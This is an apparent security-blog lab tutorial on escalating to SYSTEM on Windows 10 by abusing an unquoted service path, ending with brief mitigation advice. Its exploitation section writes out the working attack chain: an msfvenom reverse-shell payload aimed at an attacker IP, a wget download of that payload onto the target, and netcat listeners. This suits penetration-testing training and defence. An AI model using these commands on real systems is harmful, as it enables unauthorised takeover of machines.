<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Privilege Escalation: Unquoted Service Path</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/" rel="bookmark"><time class="entry-date published" datetime="2021-10-14T20:00:46+00:00">October 14, 2021</time><time class="updated" datetime="2025-07-29T07:46:26+00:00">July 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Microsoft Windows offers a wide range of fine-grained permissions and privileges for controlling access to Windows components including services, files, and registry entries. Exploiting <strong>Unquoted Service path</strong> is one technique to increase privileges.</span></p>
<p><span style="color: #000000;">Unquoted Path or Unquoted Service path is reported as a critical vulnerability in Windows, such vulnerability allows an attacker to escalate the privilege for <strong>NT AUTHORITY/SYSTEM</strong> for a low-level privilege user account.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://lh3.googleusercontent.com/-bCiNLUqalOU/YW7h5hJwHlI/AAAAAAAAy-Y/4yfCeaP-0zwrnZbwFxMQGLOQ7Aaeii_WwCLcBGAsYHQ/s16000/image.png"/></span></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<ul>
<li><strong><span style="color: #000000;">Introduction</span></strong></li>
<li><strong><span style="color: #000000;">Vulnerability Insight</span></strong></li>
<li><strong><span style="color: #000000;">Prerequisite</span></strong></li>
<li><strong><span style="color: #000000;">Lab Setup</span></strong></li>
<li><strong><span style="color: #000000;">Abusing Unquoted Service Paths</span></strong></li>
<li><strong><span style="color: #000000;">Mitigation</span></strong></li>
</ul>
<h3><span style="color: #800000;">Introduction</span></h3>
<p><span style="color: #000000;"><strong>Unquoted Service Path</strong></span></p>
<p><span style="color: #000000;">If the path to the service binary is not enclosed in quotes and contains white spaces, the name of a loophole for an installed service is Service Unquoted Path. As a result, a local user will be able to elevate the privilege to administrator privilege shell by placing an executable in a higher level directory within the path.</span></p>
<p><span style="color: #000000;"><strong>Mitre ID:</strong> T1574.009</span></p>
<p><span style="color: #000000;"><strong>Tactics:</strong> Privilege Escalation &amp; Persistence</span></p>
<p><span style="color: #000000;"><strong>Platforms:</strong> Windows</span></p>
<h3><span style="color: #800000;">Vulnerability Insight</span></h3>
<p><span style="color: #000000;">The Windows API must assume where to find the referenced application if the path contains spaces and is not enclosed by quotation marks. If, for example, a service uses the unquoted path:</span></p>
<p><span style="color: #000000;">Vulnerable Service: C:\Program Files\Ignite Data\Vuln Service\file.exe</span></p>
<p><span style="color: #000000;">The system will read this path in the following sequence from 1 to 4 to trigger malicous.exe through a writeable directory.</span></p>
<ul>
<li><strong><span style="color: #000000;">C:\Program.exe</span></strong></li>
<li><strong><span style="color: #000000;">C:\Program Files\Ignite.exe</span></strong></li>
<li><strong><span style="color: #000000;">C:\Program Files\Ignite Data\Vuln.exe</span></strong></li>
<li><strong><span style="color: #000000;">C:\Program Files\Ignite Data\Vuln Service\file.exe</span></strong></li>
</ul>
<h3><span style="color: #800000;">Prerequisite</span></h3>
<p><span style="color: #000000;"><strong>Target Machine:</strong> Windows 10</span></p>
<p><span style="color: #000000;"><strong>Attacker Machine:</strong> Kali Linux</span></p>
<p><span style="color: #000000;"><strong>Tools: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/Ignitetechnologies/OSCP_Tools/blob/main/subinacl.msi">SubinACL</a></span></strong>, <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUP.ps1</a></strong></span>, <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">Winpeas</a>.</strong></span></span></p>
<p><span style="color: #000000;"><strong>Condition:</strong> Compromise the target machine with low privilege access either using Metasploit or Netcat, etc.</span></p>
<p><span style="color: #000000;"><strong>Objective:</strong> Escalate the NT Authority /SYSTEM privileges for a low privileged user by exploiting unquoted path Vulnerability.</span></p>
<h3><span style="color: #800000;">Lab Setup</span></h3>
<p><span style="color: #000000;">Firstly, To set up a vulnerable environment for Unquoted Path, we need user accounts. Here we have user “ignite” who is a member of the Administrator group and “Shreya” who is a member Users group.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user ignite
net user shreya</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg9ZHz7cD9Le7tNHh7hUFAN5MB6Phd7W9loqulfH4x-THBuUKj3YK0k6P4bsA7X6z8fnaIbi78vCLxd0_YIDPgDwLLTcBxRCKk1B9-4QNHT9MPmnSM0JVunJR5MhXQYx6oGrVpB9OKg0N2Eyt86r9tI0BcCaOo7wssru2bC9fxcZ8UyC3ZfsnVNPgpXmg=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Steps to Setup Vulnerable Environment</strong></span></p>
<p><span style="color: #000000;"><strong>Step1:</strong>  Firstly, Create a new folder and Sub Folder and named it “Ignite Data” &amp; “Vuln Service” respectively </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir "C:\Program Files\Ignite Data\Vuln Service"</pre>
<p><span style="color: #000000;"><strong>Step2:</strong> Create vulnerable service with name file.exe</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc create "vulns" binpath= "C:\Program Files\Ignite Data\Vuln Service\file.exe" start= auto</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhS5epZVlheDhAHnTwrWmxqiz6ag81IT5OauolpG3y2frZbvNGFXti3GBxYpoICbOBsWNQrh48ku2G_K_hQBG4MPVMOmuyVG_H7uM5dOUyeU6QTJan_XtZDH_sOoJouOELKoXWysvCONM3-OfMGIpuJc-R8sCpkFdEX5rewtUywLRVqxID_D_7eENU9jQ=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Step3:</strong> Then, grant writeable for BUILTIN\Users on Ignite Data folder with the help of icacls</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">icacls "C:\Program Files\Ignite Data" /grant "BUILTIN\Users":W</pre>
<p><span style="color: #000000;"><strong><em>*icacls</em></strong><em> is Microsoft Windows native command-line programmes that can display and modify permissions on directories and files.</em></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgi7vvII1haOA4-I4LUR4_o1IjspA7iVGWeFCZPwj8GM4YEXKhPOeRy7SULa6Ld7oc3MmrD7LxIK07GP9Zv_aNXclaXwFqjoTHFlYTiz5jm6LnEShc5p6SLkWA7b8B3iOkBg5Is7A81CAIrmAVHrRb61HNgWjxTzMWCLfNNSqr0D5I5LNM3Xnnn0mo4SA=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Step4:</strong> To create a vulnerable service we need to assign some toxic privilege with the help of <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/Ignitetechnologies/OSCP_Tools/blob/main/subinacl.msi">SubinACL</a> </strong></span>to change the permission of services.</span></p>
<p><span style="color: #000000;"><strong>NOTE</strong>:</span></p>
<p><span style="color: #000000;"><em>SubInACL is a little-known command-line tool from Microsoft, yet it is one of the best tools to work with security permissions in Windows. This tool is capable of changing the permissions of files, folders, registry keys, services, printers, cluster shares and various other types of objects.</em></span></p>
<p><span style="color: #000000;"><em>In this case, we have granted a user permissions to suspend (pause/continue), start and stop (restart) a service. The full list of the available service permissions:</em></span></p>
<p><span style="color: #000000;"><strong>Step5:</strong> After Download SubinACL, execute the following command to assign <strong>PTO Permissions </strong>user “ignite” against “Pentest” service.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">subinacl.exe /service vulns /grant=msedgewin10\shreya=PTO</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjMAuxVMBVDRdc0fI9COItStL-wq8w51cxAUBN6T7C2pro9WS-rAfJgps3DEUEhqe3EeHyPEW6b0ycQZYefqDsXK0rklAKOKoQFwtEb5Nz56Ogz2x8rc71mWvokbSGbJRPbEuBCoFqYRu_P_VlVyrO-BbqK5j8d4HIylUYV-_OJV2xujzcK0cnDsboPpw=s16000"/></span></p>
<h3><span style="color: #800000;"><strong>Abusing Unquoted Service Paths</strong></span></h3>
<p><span style="color: #000000;">Abusing unquoted service is a technique that exploits insecure file permission in order to escalated privileges for local users. Download the PowerUp.ps1 script inside Kali Linux which will return the name and binary path for services with unquoted paths that also have a space in the name.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
python –m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhFDuUw9OIvHiZvpQJ5B4G7M-VqzSR6unl7nkcSkEC_PqeMbK5kogcIEBMiLkg6-mWqrebJ3ndltSIPz4VeEmBwr5QBuiwBarNC5MmoKYd4uvh_FFUUjGEvVK3CEdOrEp2KHwwd1TWmajkeCGfU5KG9r5SaR05pfvyYlPDKAMVS6GQll8MMa-7kQizCmw=s16000"/></span></p>
<p><span style="color: #000000;">Get the initial access of the target machine and transfer the PowerUp.ps1 and execute the Get-UnquotedService command that will use Get-WmiObject to query all win32_service objects and extract out the binary pathname for each. Then checks if any binary paths have a space and aren’t quoted.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 1245
powershell
wget http://192.168.1.3/PowerUp.ps1 -o PowerUP.ps1
powershell –ep bypass
Import-Module .\PowerUp.ps1
Get-UnquotedService</pre>
<p><span style="color: #000000;">As a result, we have enumerated the path for file.exe as highlighted in the below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgq4iOU7D0Q3XwnwOKQHnh1KlNG_EkcHgT4ObZG68KGPwwuWorOaymuu23sC-84FqRh_Vbqw9-0M7qylMH7r8uzgCRiQJjRVwbxCs3_P5OmCf6DWQlgNQOyALXcJydPfPrFUj_xHMj044ZCoG1cfNOurrPpMJgT_GuTMXLKJ13vqRqjC1FPZLw71spnjQ=s16000"/></span></p>
<p><span style="color: #000000;">From above, we enumerate three subdirectories: “<strong>Program Files</strong>,” “<strong>Ignite Data</strong>,” and “<strong>Vuln Service,</strong>” and for each directory, we use icacls to check permissions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">icacls "C:\Program Files"
icacls "C:\Program Files\Ignite Data"
icacls "C:\Program Files\Ignite Data\Vuln Service"</pre>
<p><span style="color: #000000;">Here we found BUILTIN\Users owns writable permissions against “Ignite Data”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgX_wQ_iqU3I5MhOtVkjSvABHxOsvlEQlRZWmhjfZ0eAnrLJX_fSjKGptfJg2iAhbgHj1WkKj1KZWvh8tgcwRYPTZ_WfnwPcbn9VHHvPyLVqUcxqv9BXqfYERyvBqdcrrkCflEAD38YmQzd6bEg2ciyyHQux13t10t--b2ksTyJg0CCWjgwtZ1ZTLYL9g=s16000"/></span></p>
<h4><span style="color: #000000;">Exploiting Unquoted Service Paths for Privilege Escalation</span></h4>
<p><span style="color: #000000;">Using auto script WinPEASx64 we enumerate the suspicious file and folder for the unquoted path.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">winPEASx64.exe quiet servicesinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhNd5FBNPzz8w-AYNNhGLOYh5FJ98S78rXDzzF5k35iJwxUwop6otCGbvoV7Pl606Jz_RXP1OLExm2nG4IZigJkXV4z93WZCKI12BGhojHJHe224Lgvy2ATePr1NxakAAEUC2VzosCMFBZpC72pKmVRwpcURKDLMg49-iBVu4Iic0SG9jGp2He_n6DhEA=s16000"/></span></p>
<p><span style="color: #000000;">As a result, it shown the same as above.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjk2mS9JcKl6dXZRmMRSpDLbhoiBr24cg2mJKhwLkrkz2WQ5-8xMFE53JxLz_hMmbPnTnHx2ucmM20Ofnb_cOC9IniMXhqiT13E0UbvMZMoTBep_wytdz2k5wpclLsqNqDAXBJFyWIB5Z9sGaGGOnN7FxR9zZwZ8D5UFuB9DXHaOCV2sZ9nBGKsf5ENQQ=s16000"/></span></p>
<p><span style="color: #000000;">It’s time to exploit the weak configured services against unquoted paths in order to privilege for user Shreya. As we know unquoted folder name is Vuln Service thus we will create a file with the name Vuln.exe with the help of msfvenom.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom –p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe &gt; Vuln.exe
python –m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgA0Fz7IUeByZ6JTLKyjGWsc86Kfa22BZO0F0l0lVv0jApPhs6R09jfx7PSmK_BMn-EFx0-wNgiGb_LDUrG6paTxfz_1gEXNGIqwnAkYheUMoKt7US5_KVMIgQMwNK7d6HeSNbYUgdM-RIhfjeJtA2VMgJx8SMtyp2geq9zqIYvnJHcEIvsfCwCBvGIRQ=s16000"/></span></p>
<p><span style="color: #000000;">Then, start a fresh netcat listener in a new terminal and transfer the Vuln.exe onto the target machine’s “<strong>Ignite Data</strong>” folder. Since Shreya is a member of <strong>BUILTIN/Users</strong> has writable permission for “Ignite Data, and restarting the service will result in a reverse connection.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd c:\Program Files\Ignite Data
powershell wget http://192.168.1.3/Vuln.exe -o Vuln.exe
net start vulns</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg2_e-ZHIFu-E_jvMhtD8xQGCHwXnw4Mnjlo5j1ZkfsHhLsX5cwqT8plLORY7yvaZmqsIgPpgUWpN-77x6b_JjAWjBr1g09qQTK1KfYo6Bz1oDJoF9_fNBhaq-cpzhBYm37GQuQT5ICwWqdv7dop8mKUw_3CJHHtgRKnOX5Ffhjxn1GYW5BYD5qEX5RwA=s16000"/></span></p>
<p><span style="color: #000000;">As soon as the service will launch, the attacker will get a reverse connection in the new netcat session as NT Authority \system</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 8888
whoami</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhspTpaqNDpSYZeLSihUuAEJ6l-cL2PROsFZ4G7IP7v3CTQfTAUkMWljTgpkDCehAkERv5gEmYyyyW61_GeQwTsJhvENlMpMSJVR7AxUVfB8XMMgCdXkCkRo2QRPUEkNrRfP5G8emVbdqHOPZXxuX-JDYCbZl9BX3l4I8S830pKSLh8xRbJ3CQyW2KGwA=s16000"/></span></p>
<p><span style="color: #000000;">Even if the user has the option to restart the system, this approach will automatically restart the Vuln.exe service, which will offer a reverse connection.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shutdown /r /t 0</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgALguYOBH30gnfguFhdPRKy9cWqrk0wQRZ86wbqv8RIVptyavCP5Fu-TNTTdyfjpnQ4FjP1prI-DDQawHy-bh5pLLy5XIQO4to73LRhuyXxPSvAFVWu4WRfWLPFErYiHlQ4EW4pkPfs2tugi2wQgFI226ZP3X9b_ZP__JfiCsPKShke7Bu1EXoxoGMsg=s16000"/></span></p>
<p><span style="color: #000000;">As soon as the service will launch, the attacker will get a reverse connection in the new netcat session as NT Authority \system</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 8888</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgSkgsNno86P05mJhxZYcsACZ1fTqmIUphEcO0TfW5AWs2iAaZbmBhGfbKhN5nxDRy_fSfSZ5n5s1frbXukUY_O9rKnTsSsYJBzQHDmkjpgv7y3us8jSpXmSMNjyGyKSNz68vTzWwe9-rO5t33Po3DfpkCrcbUCM7jrLuCBum60rY8IVISz6xygpWFYMg=s16000"/></span></p>
<h3><span style="color: #800000;">Mitigation</span></h3>
<p><span style="color: #000000;"><strong>Vulnerability Solution:</strong> Ensure that any services that contain a space in the path enclose the path in quotes.</span></p>
<p><span style="color: #000000;"><strong>Restrict File and Directory Permissions:</strong> Restrict access by setting directory and file permissions that are not specific to users or privileged accounts</span></p>
<p><span style="color: #000000;"><strong>Execution Prevention:</strong> Block execution of code on a system through application control, and/or script blocking.</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
